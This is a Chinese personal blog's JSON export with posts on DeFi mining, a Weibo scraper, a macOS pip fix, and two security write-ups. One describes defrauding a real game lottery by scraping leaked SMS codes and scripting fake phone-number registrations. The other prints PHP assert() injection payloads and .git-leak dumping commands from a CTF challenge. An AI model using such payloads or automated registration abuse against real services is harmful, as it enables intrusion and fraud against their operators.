{"meta":{"title":"Niko の 里屋","subtitle":"记录些什么的自留地","description":"Tech. 4 better life.","author":"Niko Pang","url":"http://blog.nikopang.com","root":"/"},"pages":[{"title":"关于 我","date":"2021-07-05T14:32:48.000Z","updated":"2021-09-09T09:41:06.888Z","comments":true,"path":"about/index.html","permalink":"http://blog.nikopang.com/about/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-09-09T09:37:53.591Z","updated":"2021-09-09T09:37:53.591Z","comments":false,"path":"categories/index.html","permalink":"http://blog.nikopang.com/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2018-06-07T14:17:49.000Z","updated":"2021-09-09T03:51:00.138Z","comments":true,"path":"link/index.html","permalink":"http://blog.nikopang.com/link/index.html","excerpt":"","text":""},{"title":"","date":"2021-07-13T18:59:50.916Z","updated":"2021-07-13T18:59:50.912Z","comments":true,"path":"repository/index.html","permalink":"http://blog.nikopang.com/repository/index.html","excerpt":"","text":"Githubgithub: username: n1k0ver3E # github username"},{"title":"标签","date":"2021-09-09T09:35:49.480Z","updated":"2021-09-09T09:35:49.480Z","comments":false,"path":"tags/index.html","permalink":"http://blog.nikopang.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"DeFi之旅：从单币抢头矿到链上数据追踪","slug":"BeginningofDefi","date":"2021-07-05T23:25:33.000Z","updated":"2021-09-08T16:32:19.093Z","comments":true,"path":"2021/07/05/BeginningofDefi/","link":"","permalink":"http://blog.nikopang.com/2021/07/05/BeginningofDefi/","excerpt":"","text":"1. 写在前面你好，我是Niko。2017年，你可能不知道玩客币，可能不知道迅雷当年股价的一飞冲天，可能不了解政策落地后的一地鸡毛。我就是在那个时候买卖着玩客云矿机入的场，见证了QTUM 几周的十倍暴涨，跟随者不少人加入了EOS「传销」盘，同时也见证了18年的狠狠落下，狼狈离场。 之后的2年我卸载了币安，几个月登陆一下看看btc行情，做着6000买9000卖的巨大网格，就这样看着到了2021年。幸好当时只是卸载软件，并没有清仓。到2021年我才发现，唔～当年买的bnb竟然一飞冲天了。真的是要说一声谢谢CZ。 距离BTC度过6w高点已有2月有余，见证了不少新周期的历史时刻。clubhouse的小伙伴每天为着「btc骗局」「btc暴富」争论的喋喋不休，政策的频繁落地也让做空者顺势而为，币价应声而跌，又在3w支撑有余。吃一堑长一智，这一个周期我是不会离场了，过往的韭菜经验让我充分认识到，做HODLer是真的可以挣到钱的。 2. pancakeswap 单币挖矿虽然是做HODLer, 但也要想想聪明的方法创造更多的财富和机会，我把目光投向了bsc链上的Defi。相比于ETH链，bsc链的gas费更便宜，适合新手学习，同时对币安系有一定的好感。pancakeswap是bsc链上的龙头「DeFi」项目，韭菜经验告诉我做选择要选龙头，因此开始通过pancakeswap进入DeFi的世界。 为什么是单币挖矿？ 单币挖矿，俗称的一池。指质押代币A获取代币A / 代币B。质押结束后可取回全部质押的代币A。该过程是无损的，需要承担的风险仅为币价。 流动性挖矿，俗称的二池。指通过质押代币A和代币C的交易对来提供流动性来获取代币收益。这里结成的交易对又称为LP对，LP Token。该过程有无常损失，需要承担币种u本位价格变化导致的LP Token价值的损失。在pancakeswap主要是质押新项目代币C和BNB的LP Token来获取cake。 以上是我截图的2021年7月6日晚上7点左右的pancake两个池子的截图，syrup pools 为一池，farms 为二池。 虽然二池的APR很高，但是相对的，组成LP对的大多为很新的token，因此风险极大，同时由于最近币价并不稳定波动性大，双重叠加下并不推荐。 单币池的实验 至于一池这边，我在机枪池（自动复利池）和手动池都曾做过尝试。 我曾将持仓对半平均分配到手动池和机枪池进行测试。结果显示，经过3天取消0.1% unstaking fee后，机枪池的收益仍然收益低于手动池。手动池虽然APR标的低于机枪池，但由于机枪池需要burn，整体符合和预计收益（点击计算器）接近，从预计收益的对比上看也是手动复投收益更高。 关于头矿 经验丰富的大神总会对你说，BTC is the king。我也认同。我不相信头矿会成为百倍币，千倍币，但pancake至少帮我过滤掉在合约代码上骗人的纯资金盘的山寨币。因此面对头矿我的策略是「挖提卖」。挖矿提回钱包卖成BUSD。 图上看到新币池子的收益率在80%左右，但在上新池的第1-4小时，收益往往在**200%+**，甚至更高，平均下来至少也100多。 而我也通过抢头矿的方式，在比单币质押cake的收益前提下赚取更多的矿币。 由于LP池要在pancake维持一段时间，因此只要最开始冲进矿池，在好的时间内卖掉，就不会割到你头上。说白了就是跑得快嘛。 什么是好的时间？ pancake的medium在新池更新的时候会说明： 100 CAKE for the first 48 hours, then unlimited CAKE staking afterwards. 在最开始的48小时单用户只能质押100个cake。而我想，对于选择挖提卖策略的人来看，这已经足够了。 图上所示为新池启动后20个小时后的年化收益率。最近收益比较好的池子，跑赢单币挖cake很多 3. 从冲新矿到抓鲸鱼摸清套路后的我开始冲新矿。而在一次换池的连续交易失败后，我开始思考，到底是什么样的adress owner会在第一时间涌入池子呢？他的持仓又会是什么样的呢？我开始通过bscscan开始进行分析。 使用bscscan查看交易数据 转向 www.bscscan.com，输入钱包地址即可看到交易记录和全部持有的token详情。 以上是我的一个钱包的交易记录，主要是和pancakeswap进行互动，to所对应的地址往往是token地址或钱包地址，我们可以点击进入一个token地址来观察一些较早的交易记录，来看看有无章法可循。 追踪巨鲸 以下是一个token地址最早的转账记录： 我们随便点击一条看看。 这个账户频繁进行质押和提取的操作。在开新池子的时候进去，在转天进行收割和swap卖出。我们可以发现有一笔0x9364地址转入目标地址0x4278, 为bnb的转账，想必应该是转入的预存gas费。 点击一条交易的详情也能看到，目标地址0x4278会进行busd转账操作转入到0x9364，因此我推断0x9364应该为主账户，0x4268为分账户。我又点击了token合约交易中其他的地址，发现有趣的是不少地址最终的资金流向都是0x9364。 后来我访问了0x9364的地址，印证了我的猜测。由于cake进行质押的时候有前48小时100cake的限制，所以该巨鲸账户（指大户）进行了分账户质押，分了大概60余个子账户。批量分发bnb，批量质押，批量收获，这也说明这个巨鲸账户是有成熟的脚本代为运作。数据显示，该每日的套利金额非常可观。 由于巨鲸账户会在一些时间进行卖币套利，对于小盘子的币可能会造成短期的价格波动，因此追踪巨鲸账户动向非常重要。 在bscscan上有api可以直接调用，我也会在近日完成telegram_bot的大户追踪功能，更好的锁定利润。 4. 我的思考通过研究巨鲸的操作，我发现他们的交易链条是 main account -&gt; cake -&gt; new_coin_token -&gt; busd -&gt; back。因此我在实际操作时也遵循着执行挖提卖策略后转为busd稳定币，再在币价跌的时候买入cake，来换取更大利润。 链上的数据使用之前我做的图数据库应该会变的更加容易分析来路和去向，我并不太清楚是否有这样的工具，如果有的话，欢迎朋友在评论区留言。没有的话，在未来我也可能考虑自己实现一下，这应该对链上巨鲸的数据分析更有帮助。 另外，我也正在寻找dex上币的价格波动工具，如果有的话，也欢迎留言分享。 我是Niko酱，A BTCHODLer, DeFi小韭菜，关注着区块链的发展，并积极寻求着工作机会。 以上。 14th Jul. 2021","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://blog.nikopang.com/categories/Crypto/"}],"tags":[{"name":"Defi","slug":"Defi","permalink":"http://blog.nikopang.com/tags/Defi/"}]},{"title":"记一次有意思的burp抓包经历","slug":"Burp2CrackActivity","date":"2017-09-23T21:21:01.000Z","updated":"2021-09-08T17:19:32.380Z","comments":true,"path":"2017/09/23/Burp2CrackActivity/","link":"","permalink":"http://blog.nikopang.com/2017/09/23/Burp2CrackActivity/","excerpt":"","text":"Originally wrote on Sep. 24th 2017 0x00 Introduction又是一个不断电不断网的周末。 又打开了某手游…发现有个抽奖活动！！ 通过奖品兑换cdkey拿一些奖品。 抽奖盘大概类似这样的东西⬇️ ⬇️ 左下角有个抽奖次数，上传图片还可以多次抽奖。 但不知道怎么搞的突然意外增加了抽奖次数，让我多抽了一次。这极大的引起了兴趣，感觉这活动页其中好像有些问题，本着打破砂锅问到底的精神，我打开了Burpsuite. 0x01 开始进行抓包分析刚开始对整个抽奖的过程进行一个抓包分析。 通过Foxyproxy这个浏览器插件对网页进行代理，包信息被burp捕获到，之后send to Repeater。Foxyproxy十分好用，简直就是配合burp的神器，一键代理十分方便，在chrome和firefox应用商店中均可下载. 通过返回的Response包我们发现： ① 登录后默认有一次抽奖的机会。cishu:1 ② 上传文件可以增加抽奖次数cishu++，最高可上传4次就会返回错误信息了。 ③ 每次抽奖后cishu会-1，并返回cdkey的值。通过兑换就能拿到我们想要的礼物。 分析之后就开始进行改requests的包，对比以抽奖的cookie和未抽奖的cookie，发现这并不是改包就能完成的,改cookie并不能绕过对现有用户的认证，仍需要重新登录…也不能改cishu，因为cishu并不是在requests包中进行请求的。 0x02 注册环节花费了很长时间研究在改包上，但并没有什么突破。无法通过改cishu来实现我们的目的，那就换个方向去研究一下用户注册以及登录。之后我就去抓一下注册登录的包来观察一番。因为抽奖规则就是新账号注册就有抽奖机会，而这一过程并不检测IP。仅通过手机号进行关联。 将注册的包send to repeater来观察一番验证码的流程，有了很大的收获。 第一次请求: 并没有返回任何值~ 本着打CTF的比赛经验，我又习惯性的请求了第二次：页面上返回了验证码！response返回了int(255035)。 这样我们就能通过get请求来接受返回的response包的信息，得到验证码。这样就突破了注册的限制，通过脚本的编写可以完成之前所进行的操作。 0x03 After writing.之后就是写了python的代码来完成了自动化的过程，添加了random的库随机生成了手机号并通过shell脚本一直运行，收获了很多很多的cdkey，造福了朋友和自己。 随机生成手机号的代码： 1234567891011mobile_nums=[]for i in range(10): ran_num=random.uniform(13,14)*1000000000 ran_num=str(ran_num) ran_mobile=ran_num[:11] mobile_nums.append(ran_mobile)f=open(&quot;/Users/Niko/Desktop/cdkey&quot;,&#x27;a&#x27;)f.write(&quot;-----------------------------\\n&quot;)f.write(&quot;mobile_nums=&quot;+str(mobile_nums)+&quot;\\n&quot;) shell脚本： 写了shell脚本来循环跑了50次，开了2个进程，吃完饭发现成果颇丰ð~ 1234567#!/bin/shi=0while [ &quot;$i&quot; != &quot;50&quot; ]do python ~.py i=$(($i+1))done 本体就是requests库的应用，害怕被顺丰我就不po了… 0x04 PS 一次很有趣的经历让我对网络安全又增加了兴趣，永远保持着好奇心是最重要和有趣的！ 不管是作为开发者还是渗透测试人员，都要严格代码规范，以及加强安全性检测和管理。抓了包发现很多变量名都很不formal，某种程度上坚定了我一定要攻克它的决心2333333 感谢围观。 By Niko.","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.nikopang.com/categories/Record/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://blog.nikopang.com/tags/Security/"}]},{"title":"简单的免登陆抓取新浪微博数据","slug":"Crawlerweibonotloggin","date":"2017-08-22T17:09:26.000Z","updated":"2021-09-08T17:22:22.356Z","comments":true,"path":"2017/08/22/Crawlerweibonotloggin/","link":"","permalink":"http://blog.nikopang.com/2017/08/22/Crawlerweibonotloggin/","excerpt":"","text":"Originally wrote on Aug. 23nd, 2017 0x00 Introduction饭偶像之后承担了写群机器人的工作，所以最近一直在鼓弄爬虫，写了集资实时监控，现在是微博监控，之后还要写其他东西…库亚西。 之前就看过很多爬微博的一些文章，不过大多需要模拟登录，或者是调用weibo的api，后来貌似API权限逐渐降低，也就变得不实用了。。。 手机版weibohttp://m.weibo.com后加uid便可以进行博文。 这个爬虫的小程序是通过手机版weibohttp://m.weibo.com来进行模拟请求，不是通过分析html代码再通过筛选来完成数据抓取。简单的介绍就是这样，后面是正文！33 0x01 Let’s Start1. 获取微博用户的对应Id 使用的工具是：Chrome 开发者工具Windows下快捷键：F12MacOS下快捷键：alt+cmd+i 打开 开发者工具-选中network-在左边选中带有getIndex?的包 获取我们所需要的uid和containerId. PS:虽然Query String字段有很多项，但仅需要uid和containerId就可以定位到置顶微博用户。 2. 寻找所需要的请求可见它是有很多JSON数据在一起的请求包 而微博正文就隐藏在这个请求包中的mblog中 3. 原始数据获取及转码我们来通过 requests 库写一个简单的模拟请求。 在这里我们使用py3。相比于py2的优点是不需要额外进行 unicode to 中文的转化。 12345import requestsurl=&quot;https://m.weibo.cn/api/container/getIndex&quot;payload=&#123;&#x27;type&#x27;:&#x27;uid&#x27;,&#x27;value&#x27;:&#x27;5879771257&#x27;,&#x27;containerid&#x27;:&#x27;1076035879771257&#x27;&#125;r=requests.post(url,data=payload)raw_text=r.text 如果是py2的话，还要raw_text=r.text.encode().decode() encode之后是byte格式，decode使其变成str格式。 4. JSON转换成dict数据本来就是JSON对象。通过json.loads()转换为python的数据字典dict.再通过dict的定位就可以抓取到微博内容了。 0x02 完整代码#原始URL:https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=5931004865&amp;containerid=1076035931004865 import requests import json url=&quot;https://m.weibo.cn/api/container/getIndex&quot; payload=&#123;&#39;type&#39;:&#39;uid&#39;,&#39;value&#39;:&#39;5879771257&#39;,&#39;containerid&#39;:&#39;1076035879771257&#39;&#125; r=requests.post(url,data=payload) raw_text=r.text d=json.loads(raw_text) for i in range(10): print(d[&quot;cards&quot;][i][&quot;mblog&quot;][&quot;text&quot;]) 0x03 PS 不仅仅是博文内容，个人资料等只要出现在m.weibo.com的内容均可以爬取下来。 一个请求包含最多10条微博，可通过再末尾加入page页数来继续循环模拟请求。 Example: https://m.weibo.cn/api/container/getIndex?type=uid&amp;value=5879771257&amp;containerid=1076035879771257&amp;page=2 有其他问题可以在评论框提出。尚未发现banIP的情况。 0x04 Update in 2021本项目已归档。 爬虫及队列更新请于github查看。","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"http://blog.nikopang.com/categories/Tutorial/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.nikopang.com/tags/Python/"},{"name":"Crawl","slug":"Crawl","permalink":"http://blog.nikopang.com/tags/Crawl/"}]},{"title":"macOS 下通过pip安装Ipython权限问题解决","slug":"SolutionIpythonInstall","date":"2017-02-15T20:50:12.000Z","updated":"2021-07-13T18:43:20.172Z","comments":true,"path":"2017/02/15/SolutionIpythonInstall/","link":"","permalink":"http://blog.nikopang.com/2017/02/15/SolutionIpythonInstall/","excerpt":"","text":"Originally wrote on Feb. 16th 2017 0x00 Before writing安装了pip之后就开始安装ipython了。使用sudo pip install ipython却一直显示_Operation notpermitted_这让我非常苦恼。 本机 macOS Sierra 10.12.3 12345678910111213141516171819202122232425Exception:Traceback (most recent call last): File &quot;/Library/Python/2.7/site-packages/pip/basecommand.py&quot;, line 209, in main status = self.run(options, args) File &quot;/Library/Python/2.7/site-packages/pip/commands/install.py&quot;, line 317, in run prefix=options.prefix_path, File &quot;/Library/Python/2.7/site-packages/pip/req/req_set.py&quot;, line 732, in install **kwargs File &quot;/Library/Python/2.7/site-packages/pip/req/req_install.py&quot;, line 835, in install self.move_wheel_files(self.source_dir, root=root, prefix=prefix) File &quot;/Library/Python/2.7/site-packages/pip/req/req_install.py&quot;, line 1030, in move_wheel_files isolated=self.isolated, File &quot;/Library/Python/2.7/site-packages/pip/wheel.py&quot;, line 376, in move_wheel_files clobber(source, dest, False, fixer=fixer, filter=filter) File &quot;/Library/Python/2.7/site-packages/pip/wheel.py&quot;, line 315, in clobber ensure_dir(destdir) File &quot;/Library/Python/2.7/site-packages/pip/utils/__init__.py&quot;, line 83, in ensure_dir os.makedirs(path) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.py&quot;, line 150, in makedirs makedirs(head, mode) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.py&quot;, line 150, in makedirs makedirs(head, mode) File &quot;/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/os.py&quot;, line 157, in makedirs mkdir(name, mode)OSError: [Errno 1] Operation not permitted: &#x27;/System/Library/Frameworks/Python.framework/Versions/2.7/share&#x27; 提示是权限问题，但是却发现改成root也是不能成功，搁置了一下。 0x01 SIP机制google了很久发现了一个叫做SIP的机制被应用到MAC OSX EICapitan中增加了一个SIP功能，不管你是不是su，都会阻止你在系统目录下进行操作…… 既然是一种机制，那就只能想着去关上就好了。又找到了解决的办法： (1) 重启OSX系统，然后按住Command+R (2) 出现界面之后，选择Utilities menu中Terminal (3) 在Terminal中输入csrutil disable关闭SIP(csrutil enable打开SIP) (4) 重启reboot OSX 0x02 方式改进果然上面那种方法看着很难受，不过却从原理上解释了为什么会出现deny。 不过后来发现这并不是最优雅的方法！！ 1pip install ipython --user -U 基于用户的权限来安装包。 执行之后会提示： Installing collected packages: setuptoolsSuccessfully installed setuptools-34.2.0 继而安装成功setuptools.再通过easy_install ipython就能成功安装ipython了。 0x03 引用 http://xiaorui.cc/2016/03/27/解决mac-osx下pip安装ipython权限的问题/ http://www.freebuf.com/articles/system/97411.html","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"http://blog.nikopang.com/categories/Tutorial/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://blog.nikopang.com/tags/Python/"},{"name":"macOS","slug":"macOS","permalink":"http://blog.nikopang.com/tags/macOS/"}]},{"title":"关于Git/config.泄露的小结 及 assert()函数注入初探","slug":"GitLeak","date":"2016-10-25T20:57:43.000Z","updated":"2021-09-08T17:24:01.479Z","comments":true,"path":"2016/10/25/GitLeak/","link":"","permalink":"http://blog.nikopang.com/2016/10/25/GitLeak/","excerpt":"","text":"Originally wrote on Oct. 26th 2016 0x00 写在前面晚上Ifuryst发了个web题链接玩玩 http://web.chal.csaw.io:8000/. 浏览了一下发现了简直是直钩，你好我知道有猫腻。git泄漏！ 0x01 GitHackGitHack.py https://github.com/lijiejie/GitHack 1python GitHack.py URL/.git 检测到了相关目录并下载源码到我的本地。flag.php 的源码没啥东西… 0x02 assert() 注入打开了index.php,看到了很多以assert()函数，通过Ifuryst点拨，知道存在assert()注入。用“||”进行屏蔽前面的内容，之后在输入 http://web.chal.csaw.io:8000/?page=NIKO || print(file_get_contents(&quot;templates/flag.php&quot;));// http://web.chal.csaw.io:8000/?page=NIKO) || system(&quot;cat templates/flag.php &quot;);// 0x03 rip-git.pl除了GitHack之外，基于Perl写的rip-git也很好用。 获得页面源码： 1perl rip-git.pl -v -u http://web.chal.csaw.io:8000/.git","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.nikopang.com/categories/Note/"}],"tags":[{"name":"Security","slug":"Security","permalink":"http://blog.nikopang.com/tags/Security/"}]}],"categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://blog.nikopang.com/categories/Crypto/"},{"name":"Record","slug":"Record","permalink":"http://blog.nikopang.com/categories/Record/"},{"name":"Tutorial","slug":"Tutorial","permalink":"http://blog.nikopang.com/categories/Tutorial/"},{"name":"Note","slug":"Note","permalink":"http://blog.nikopang.com/categories/Note/"}],"tags":[{"name":"Defi","slug":"Defi","permalink":"http://blog.nikopang.com/tags/Defi/"},{"name":"Security","slug":"Security","permalink":"http://blog.nikopang.com/tags/Security/"},{"name":"Python","slug":"Python","permalink":"http://blog.nikopang.com/tags/Python/"},{"name":"Crawl","slug":"Crawl","permalink":"http://blog.nikopang.com/tags/Crawl/"},{"name":"macOS","slug":"macOS","permalink":"http://blog.nikopang.com/tags/macOS/"}]}